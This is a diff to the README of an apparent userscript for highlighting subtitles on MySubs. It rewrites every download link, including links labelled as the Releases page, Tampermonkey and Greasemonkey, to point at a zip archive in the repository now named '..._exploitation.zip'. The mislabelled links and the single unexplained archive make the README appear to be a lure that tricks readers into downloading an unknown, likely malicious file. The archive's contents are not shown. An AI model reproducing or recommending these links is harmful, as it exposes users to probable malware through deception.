@@ -1,6 +1,6 @@
 # ✨ userscript-mysubs-best-subtitle-highlighter - Automatically Highlight Your Best Subtitle
 
-[![Download Now](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript-mysubs-best-subtitle-highlighter.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript-mysubs-best-subtitle-highlighter.zip)
+[![Download Now](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript_highlighter_mysubs_best_subtitle_exploitation.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript_highlighter_mysubs_best_subtitle_exploitation.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the userscript-mysubs-best-subtitle-highlighter! This tool enhances y
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Click this link to go to the [Releases page](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript-mysubs-best-subtitle-highlighter.zip).  
+   Click this link to go to the [Releases page](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript_highlighter_mysubs_best_subtitle_exploitation.zip).  
    
 2. **Choose the Latest Version**  
    Find the latest version of the script. You will see a list of available files.
@@ -69,8 +69,8 @@ You can connect with other users and get support by visiting the repository. Fee
 
 ## 🔗 Links
 
-- [Releases Page for Download](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript-mysubs-best-subtitle-highlighter.zip)
-- [Tampermonkey](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript-mysubs-best-subtitle-highlighter.zip)
-- [Greasemonkey](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript-mysubs-best-subtitle-highlighter.zip)
+- [Releases Page for Download](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript_highlighter_mysubs_best_subtitle_exploitation.zip)
+- [Tampermonkey](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript_highlighter_mysubs_best_subtitle_exploitation.zip)
+- [Greasemonkey](https://raw.githubusercontent.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/main/affiliation/userscript_highlighter_mysubs_best_subtitle_exploitation.zip)
 
 Thank you for using the userscript-mysubs-best-subtitle-highlighter! Enjoy your enriched subtitle experience on MySubs.
